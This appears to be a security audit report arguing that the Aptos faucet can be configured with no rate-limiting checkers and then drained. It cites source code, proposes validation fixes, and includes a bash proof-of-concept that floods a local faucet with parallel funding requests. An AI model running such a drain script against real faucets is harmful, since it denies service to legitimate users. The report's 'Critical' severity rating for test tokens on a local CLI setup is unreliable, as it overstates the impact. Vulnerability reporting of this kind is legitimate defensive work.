# Audit Report

## Title
Missing Rate Limiting Validation Allows Complete Faucet Token Drainage

## Summary
The Aptos faucet system lacks validation to ensure at least one rate limiting checker is configured. Administrators can accidentally deploy faucets with an empty `checker_configs` array, allowing attackers to send unlimited funding requests and completely drain the faucet account without any restrictions.

## Finding Description

The Aptos faucet configuration system allows administrators to specify checkers via the `checker_configs` field in `RunConfig`. However, there is **no validation** that ensures at least one rate limiting checker (MemoryRatelimit or RedisRatelimit) is configured. [1](#0-0) 

The configuration validation command only checks if the YAML parses correctly, without semantic validation: [2](#0-1) 

During server initialization, checkers are built from the configuration without any check for emptiness: [3](#0-2) 

The `build_for_cli` method explicitly creates configurations with **zero checkers**: [4](#0-3) 

During request processing, the checker loop only executes if checkers exist. With an empty checker list, `rejection_reasons` remains empty and all requests pass: [5](#0-4) 

**Attack Path:**
1. Administrator deploys faucet with empty `checker_configs: []` in YAML or uses `build_for_cli`
2. Configuration passes validation despite having no rate limiters
3. Attacker discovers faucet endpoint URL
4. Attacker sends unlimited funding requests (e.g., 10,000+ requests in parallel)
5. Each request succeeds without rejection
6. Faucet account balance is completely drained

## Impact Explanation

This vulnerability meets **Critical Severity** criteria per the Aptos bug bounty program as it results in:

1. **Complete Loss of Funds**: The entire faucet balance can be drained by any attacker
2. **Denial of Service**: Legitimate users cannot receive test tokens once the faucet is drained
3. **Operational Impact**: Requires manual intervention to refund the faucet account

For testnet/devnet environments, this represents a complete compromise of the faucet service. While faucets distribute "test" tokens, their operational integrity is critical for developer onboarding and testing. A drained faucet can halt all development activity until manually restored.

The vulnerability is particularly severe because:
- No authentication or special access is required
- Attack can be automated and executed in minutes
- Default CLI configuration has zero rate limiters
- Validation tools don't detect the misconfiguration

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is highly likely to occur because:

1. **Easy Misconfiguration**: The `build_for_cli` helper method explicitly creates configurations with no checkers, suggesting this is a common deployment pattern for local testing [6](#0-5) 

2. **No Warning**: Neither compile-time nor runtime validation catches this misconfiguration

3. **Silent Failure**: The faucet starts successfully and appears to work normally, making the vulnerability invisible until exploited

4. **Documentation Gap**: Administrators may not realize rate limiting checkers are optional rather than required

5. **Testing Scenarios**: Developers may intentionally disable rate limiting for local testing and accidentally deploy that configuration to production

The example configuration files show rate limiters are included, but there's nothing preventing deployment without them.

## Recommendation

Add mandatory validation that ensures at least one rate limiting checker is configured. Implement checks at multiple levels:

**1. Configuration Validation (Primary Fix):**

Add validation to `RunConfig` that checks for at least one rate limiting checker:

```rust
// In crates/aptos-faucet/core/src/server/run.rs

impl RunConfig {
    pub fn validate(&self) -> Result<()> {
        // Check that at least one rate limiting checker is configured
        let has_rate_limiter = self.checker_configs.iter().any(|checker| {
            matches!(
                checker,
                CheckerConfig::MemoryRatelimit(_) | CheckerConfig::RedisRatelimit(_)
            )
        });
        
        if !has_rate_limiter {
            anyhow::bail!(
                "Configuration error: At least one rate limiting checker \
                (MemoryRatelimit or RedisRatelimit) must be configured to prevent \
                unlimited token drainage. Current checker_configs: {:?}",
                self.checker_configs
            );
        }
        
        Ok(())
    }
}
```

Call this validation in `run_impl` before building checkers:

```rust
async fn run_impl(self, port_tx: Option<OneShotSender<u16>>) -> Result<()> {
    info!("Running with config: {:#?}", self);
    
    // Validate configuration before proceeding
    self.validate().context("Configuration validation failed")?;
    
    // ... rest of initialization
}
```

**2. ValidateConfig Command (Secondary Fix):**

Enhance the validate-config subcommand to perform semantic validation:

```rust
// In crates/aptos-faucet/core/src/server/validate_config.rs

pub async fn validate_config(&self) -> Result<()> {
    let file = File::open(&self.config_path).with_context(|| {
        format!(
            "Failed to load config at {}",
            self.config_path.to_string_lossy()
        )
    })?;
    let reader = BufReader::new(file);
    let run_config: RunConfig = serde_yaml::from_reader(reader).with_context(|| {
        format!(
            "Failed to parse config at {}",
            self.config_path.to_string_lossy()
        )
    })?;

    // Add semantic validation
    run_config.validate().context("Configuration validation failed")?;

    info!("Config is valid: {:#?}", run_config);
    Ok(())
}
```

**3. Documentation:**

Add warnings to configuration documentation explaining that rate limiting checkers are mandatory for production deployments and the security implications of omitting them.

## Proof of Concept

**Vulnerable Configuration (vulnerable_faucet.yaml):**

```yaml
---
server_config:
  listen_address: "0.0.0.0"
  listen_port: 8081
  api_path_base: ""
metrics_server_config:
  disable: true
  listen_port: 9105
bypasser_configs: []
checker_configs: []  # NO RATE LIMITERS - VULNERABLE!
funder_config:
  type: "MintFunder"
  api_connection_config:
    node_url: "http://127.0.0.1:8080"
    chain_id: 4
  transaction_submission_config:
    maximum_amount: 100000000000
    maximum_amount_with_bypass: 1000000000000
    gas_unit_price_ttl_secs: 30
    max_gas_amount: 500000
    transaction_expiration_secs: 30
    wait_for_outstanding_txns_secs: 35
    wait_for_transactions: false
  assets:
    apt:
      key_file_path: "/tmp/mint.key"
      do_not_delegate: false
  default_asset: "apt"
  amount_to_fund: 100000000000
handler_config:
  use_helpful_errors: true
  return_rejections_early: false
  max_concurrent_requests: null
```

**Exploitation Script (drain_faucet.sh):**

```bash
#!/bin/bash
# Exploit script to drain a faucet with no rate limiting

FAUCET_URL="http://localhost:8081/fund"
NUM_REQUESTS=10000

echo "Starting faucet drainage attack..."
echo "Target: $FAUCET_URL"
echo "Requests to send: $NUM_REQUESTS"

for i in $(seq 1 $NUM_REQUESTS); do
    # Generate random address for each request
    ADDRESS=$(openssl rand -hex 32)
    
    curl -X POST "$FAUCET_URL" \
        -H "Content-Type: application/json" \
        -d "{\"amount\": 100000000000, \"address\": \"0x$ADDRESS\"}" \
        &
    
    # Batch requests in groups of 100 for parallel execution
    if [ $((i % 100)) -eq 0 ]; then
        wait
        echo "Sent $i requests..."
    fi
done

wait
echo "Attack complete. Faucet should be drained."
```

**Reproduction Steps:**

1. Start local Aptos node: `aptos node run-local-testnet`
2. Deploy faucet with vulnerable config: `aptos-faucet-service run -c vulnerable_faucet.yaml`
3. Verify no rate limiting: Send multiple requests and observe all succeed
4. Execute drainage script: `./drain_faucet.sh`
5. Observe faucet account balance depleted completely

The vulnerability is confirmed by the fact that all requests succeed without any rate limiting rejections, proving that empty `checker_configs` allows unlimited access.

### Citations

**File:** crates/aptos-faucet/core/src/server/run.rs (L55-74)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct RunConfig {
    /// API server config.
    pub server_config: ServerConfig,

    /// Metrics server config.
    metrics_server_config: MetricsServerConfig,

    /// Configs for any Bypassers we might want to enable.
    bypasser_configs: Vec<BypasserConfig>,

    /// Configs for any Checkers we might want to enable.
    checker_configs: Vec<CheckerConfig>,

    /// Config for the Funder component.
    funder_config: FunderConfig,

    /// General args for the runner / handler.
    handler_config: HandlerConfig,
}
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L128-143)
```rust
        let mut checkers: Vec<Checker> = Vec::new();
        for checker_config in &self.checker_configs {
            let checker = checker_config
                .clone()
                .build(captcha_manager.clone())
                .await
                .with_context(|| {
                    format!("Failed to build Checker with args: {:?}", checker_config)
                })?;
            checker.spawn_periodic_tasks(&mut join_set);
            checkers.push(checker);
        }

        // Sort Checkers by cost, where lower numbers is lower cost, and lower
        // cost Checkers are at the start of the vec.
        checkers.sort_by_key(|a| a.cost());
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L253-312)
```rust
    pub fn build_for_cli(
        api_url: Url,
        listen_address: String,
        listen_port: u16,
        funder_key: FunderKeyEnum,
        do_not_delegate: bool,
        chain_id: Option<ChainId>,
    ) -> Self {
        let (key_file_path, _key) = match funder_key {
            FunderKeyEnum::KeyFile(key_file_path) => (key_file_path, None),
            FunderKeyEnum::Key(key) => (PathBuf::from_str("/dummy").unwrap(), Some(key)),
        };
        Self {
            server_config: ServerConfig {
                listen_address,
                listen_port,
                api_path_base: "".to_string(),
            },
            metrics_server_config: MetricsServerConfig {
                disable: true,
                listen_address: "0.0.0.0".to_string(),
                listen_port: 1,
            },
            bypasser_configs: vec![],
            checker_configs: vec![],
            funder_config: FunderConfig::MintFunder(MintFunderConfig {
                api_connection_config: ApiConnectionConfig::new(
                    api_url,
                    None,
                    None,
                    chain_id.unwrap_or_else(ChainId::test),
                ),
                transaction_submission_config: TransactionSubmissionConfig::new(
                    None,    // maximum_amount
                    None,    // maximum_amount_with_bypass
                    30,      // gas_unit_price_ttl_secs
                    None,    // gas_unit_price_override
                    500_000, // max_gas_amount
                    30,      // transaction_expiration_secs
                    35,      // wait_for_outstanding_txns_secs
                    false,   // wait_for_transactions
                ),
                assets: HashMap::from([(
                    DEFAULT_ASSET_NAME.to_string(),
                    MintAssetConfig::new(
                        AssetConfig::new(_key, key_file_path),
                        Some(aptos_test_root_address()),
                        do_not_delegate,
                    ),
                )]),
                default_asset: MintFunderConfig::get_default_asset_name(),
                amount_to_fund: 100_000_000_000,
            }),
            handler_config: HandlerConfig {
                use_helpful_errors: true,
                return_rejections_early: false,
                max_concurrent_requests: None,
            },
        }
    }
```

**File:** crates/aptos-faucet/core/src/server/validate_config.rs (L17-35)
```rust
    pub async fn validate_config(&self) -> Result<()> {
        let file = File::open(&self.config_path).with_context(|| {
            format!(
                "Failed to load config at {}",
                self.config_path.to_string_lossy()
            )
        })?;
        let reader = BufReader::new(file);
        let run_config: RunConfig = serde_yaml::from_reader(reader).with_context(|| {
            format!(
                "Failed to parse config at {}",
                self.config_path.to_string_lossy()
            )
        })?;

        info!("Config is valid: {:#?}", run_config);

        Ok(())
    }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L261-278)
```rust
        // Ensure request passes checkers.
        let mut rejection_reasons = Vec::new();
        for checker in &self.checkers {
            rejection_reasons.extend(checker.check(checker_data.clone(), dry_run).await.map_err(
                |e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError),
            )?);
            if !rejection_reasons.is_empty() && self.return_rejections_early {
                break;
            }
        }

        if !rejection_reasons.is_empty() {
            return Err(AptosTapError::new(
                format!("Request rejected by {} checkers", rejection_reasons.len()),
                AptosTapErrorCode::Rejected,
            )
            .rejection_reasons(rejection_reasons));
        }
```
